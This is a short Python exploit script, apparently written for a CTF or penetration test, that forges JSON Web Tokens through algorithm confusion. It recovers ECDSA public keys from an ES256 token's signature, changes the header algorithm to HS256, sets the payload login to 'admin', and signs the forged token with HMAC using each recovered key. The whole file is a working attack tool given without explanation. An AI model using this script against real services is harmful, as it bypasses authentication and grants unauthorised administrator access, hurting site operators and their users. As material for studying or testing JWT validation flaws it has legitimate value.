import base64
import hashlib
from hashlib import sha256
import hmac
import json

from ecdsa.ecdsa import Signature, generator_256
from ecdsa import VerifyingKey, NIST256p

jwt = "YOUR-JWT-TOKEN"

h, p, s = jwt.split('.')

signature = base64.urlsafe_b64decode(s)

sig = Signature(int.from_bytes(signature[0:32],'big'), int.from_bytes(signature[32:], 'big'))

keys = sig.recover_public_keys(int.from_bytes(sha256((h+'.'+p).encode('utf8')).digest(), 'big'), generator_256)


header = json.loads(str(base64.urlsafe_b64decode(h+"==").decode('utf8')))
payload = json.loads(str(base64.urlsafe_b64decode(p+"==").decode('utf8')))
header['alg'] = "HS256"
payload['login'] = "admin"

h2=base64.urlsafe_b64encode(json.dumps(header).encode('utf8')).decode('utf8')
p2=base64.urlsafe_b64encode(json.dumps(payload).encode('utf8')).decode('utf8')

for key in keys:
    vk = VerifyingKey.from_public_point(key.point, curve=NIST256p)
    signing = str(vk.to_pem().decode('utf8')) 
    print(signing)
    newsig = base64.urlsafe_b64encode(hmac.new(vk.to_pem(),(h2+'.'+p2).encode('utf8'), hashlib.sha256).digest()).decode('utf8')
    print(h2+'.'+p2+'.'+newsig)